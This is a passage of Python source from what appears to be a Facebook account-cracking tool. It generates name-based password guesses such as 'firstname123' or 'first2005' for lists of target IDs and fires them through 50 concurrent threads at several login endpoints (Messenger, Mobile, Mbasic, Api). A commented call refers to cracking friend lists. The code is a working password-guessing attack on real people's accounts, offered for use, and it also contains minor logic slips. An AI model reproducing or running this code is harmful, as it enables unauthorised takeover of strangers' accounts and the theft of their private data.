                        pwd.append(f + integer)
                    elif "firstlast" == string:
                        pwd.append(f + l + integer)
                    elif "last" == string:
                        pwd.append(l + integer)
                    elif "last" == string:
                        pwd.append(l.title() + integer)
                    elif "unspace" == string:
                        pwd.append(name.replace(" ","") + integer)
                    elif "First" == string:
                        pwd.append(f.title() + integer)
                    elif "name" == string:
                        pwd.append(name + integer)
                    elif "Name" == integer:
                        pwd.append(Name + integer)
                if login_ == "Messenger":
                    mx.submit(Messenger, ID, pwd, total)
                elif login_ == "Mobile":
                    mx.submit(Mobile, ID, pwd, total)
                elif login_ == "Mbasic":
                    mx.submit(Mbasic, ID, pwd, total)
                elif login_ == "Alpha":
                    mx.submit(Alpha, ID, pwd, total)
                elif login_ == "Ansyc":
                    mx.submit(Ansyc, ID, pwd, total)
                elif login_ == "Api":
                    mx.submit(Api, ID, pwd, total)
        print('\r')
        line()
        print(f"{gr}Process Has Been Finished")
        line()


    def mx_lowest(self, ids, login_):
        logo()
        total = int(len(ids))
        with Th(max_workers=50) as mx:
            for i in ids:
                ID, Name = i.split("|")
                name = Name.lower()
                f = name.split(" ")[0]
                try:
                    l = name.split(" ")[1]
                except:
                    l = ""
                pwd = []
                pwd.append(Name)
                pwd.append(name)
                pwd.append(name.replace(" ",""))
                pwd.append(name.replace(" ","")+"123")
                pwd.append(name.replace(" ","")+"1234")
                pwd.append(name.replace(" ","")+"12345")
                pwd.append(f + l)
                pwd.append(f + "123")
                pwd.append(f + "1234")
                pwd.append(f + "12345")
                pwd.append(name + "123")
                pwd.append(name + "1234")
                pwd.append(name + "12345")
                if login_ == "Messenger":
                    mx.submit(Messenger, ID, pwd, total)
                elif login_ == "Mobile":
                    mx.submit(Mobile, ID, pwd, total)
                elif login_ == "Mbasic":
                    mx.submit(Mbasic, ID, pwd, total)
                elif login_ == "Alpha":
                    mx.submit(Alpha, ID, pwd, total)
                elif login_ == "Ansyc":
                    mx.submit(Ansyc, ID, pwd, total)
                elif login_ == "Api":
                    mx.submit(Api, ID, pwd, total)
        print('\r')
        line()
        print(f"{gr}Process Has Been Finished")
        line()
    

    def mx_fewer(self,ids, login_):
        logo()
        total = int(len(ids))
        with Th(max_workers=50) as mx:
            for i in ids:
                ID, Name = i.split("|")
                name = Name.lower()
                f = name.split(" ")[0]
                try:
                    l = name.split(" ")[1]
                except:
                    l = ""
                pwd = []
                pwd.append(Name)
                pwd.append(name)
                pwd.append(name.replace(" ",""))
                pwd.append(name.replace(" ","")+"123")
                pwd.append(name.replace(" ","")+"1234")
                pwd.append(name.replace(" ","")+"12345")
                pwd.append(f + l)
                pwd.append(f + "123")
                pwd.append(f + "1234")
                pwd.append(f + "12345")
                pwd.append(f + "2005")
                pwd.append(f + "2006")
                pwd.append(f + "2007")
                pwd.append(f + "2008")
                pwd.append(f + "2009")
                pwd.append(name + "123")
                pwd.append(name + "1234")
                pwd.append(name + "12345")
                if login_ == "Messenger":
                    mx.submit(Messenger, ID, pwd, total)
                elif login_ == "Mobile":
                    mx.submit(Mobile, ID, pwd, total)
                elif login_ == "Mbasic":
                    mx.submit(Mbasic, ID, pwd, total)
                elif login_ == "Alpha":
                    mx.submit(Alpha, ID, pwd, total)
                elif login_ == "Ansyc":
                    mx.submit(Ansyc, ID, pwd, total)
                elif login_ == "Api":
                    mx.submit(Api, ID, pwd, total)
        print('\r')
        line()
        print(f"{gr}Process Has Been Finished")
        line()

    def mx_more(self,ids, login_):
        logo()
        total = int(len(ids))
        with Th(max_workers=50) as mx:
            for i in ids:
                ID, Name = i.split("|")
                name = Name.lower()
                f = name.split(" ")[0]
                try:
                    l = name.split(" ")[1]
                except:
                    l = ""
                pwd = []
                pwd.append(Name)
                pwd.append(name)
                pwd.append(name.replace(" ",""))
                pwd.append(name.replace(" ","") + "123")
                pwd.append(name.replace(" ","") + "1234")
                pwd.append(name.replace(" ","") + "12345")
                pwd.append(f + l)
                pwd.append(f + l + "123")
                pwd.append(f + l + "1234")
                pwd.append(f + l + "12345")
                pwd.append(f + "123")
                pwd.append(f + "1234")
                pwd.append(f + "12345")
                pwd.append(f + "2005")
                pwd.append(f + "2006")
                pwd.append(f + "2007")
                pwd.append(f + "2008")
                pwd.append(f + "2009")
                pwd.append(name + "123")
                pwd.append(name + "1234")
                pwd.append(name + "12345")
                if login_ == "Messenger":
                    mx.submit(Messenger, ID, pwd, total)
                elif login_ == "Mobile":
                    mx.submit(Mobile, ID, pwd, total)
                elif login_ == "Mbasic":
                    mx.submit(Mbasic, ID, pwd, total)
                elif login_ == "Alpha":
                    mx.submit(Alpha, ID, pwd, total)
                elif login_ == "Ansyc":
                    mx.submit(Ansyc, ID, pwd, total)
                elif login_ == "Api":
                    mx.submit(Api, ID, pwd, total)
        print('\r')
        line()
        print(f"{gr}Process Has Been Finished")
        line()
   
    
    


#Friend_List_Cracking()
#Approval()
mainmenu()